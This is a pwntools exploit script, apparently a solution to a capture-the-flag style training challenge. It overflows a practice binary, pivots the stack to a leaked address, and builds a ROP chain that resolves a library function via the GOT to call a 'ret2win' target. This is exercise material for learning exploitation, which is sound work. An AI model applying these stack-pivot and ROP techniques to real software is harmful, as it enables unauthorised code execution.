from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
# the library want to pivot to
lib = ELF('./libpivot.so')
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

#x = cyclic(500)
#p.sendline(x)

padding = b'A' * 40
chain1 = padding

#calculate the offset for the ret2win function
offset = lib.sym['ret2win'] - lib.sym['foothold_function']

# capture the pivot address the program prints each time
p.recvuntil("pivot: 0x")
pivotaddress = int(p.recv(12), 16)

chain1 += p64(0x4009bb) # pop rax; ret;
chain1 += p64(pivotaddress)
# set stack pointer to the address want to pivot to
chain1 += p64(0x4009bd) #xchg rsp, rax; ret;

chain2 = p64(e.plt['foothold_function']) # to populate GOT
chain2 += p64(0x4009bb) # pop rax; ret;
chain2 += p64(e.got['foothold_function'])
chain2 += p64(0x4009c0) # mov rax, qword ptr [rax]; ret;
chain2 += p64(0x4007c8) # pop rbp; ret;
chain2 += p64(offset)   # want offset to ret2win in rbp
chain2 += p64(0x4009c4) # add rax, rbp; ret;
# call rax invokes the function whose address is in rax
# rax now contains the address for ret2win
chain2 += p64(0x4006b0) # call rax;

p.recvuntil(">")
p.sendline(chain2)

p.recvuntil(">")
p.sendline(chain1)

response = p.recvall().decode()
print(response)

p.interactive()

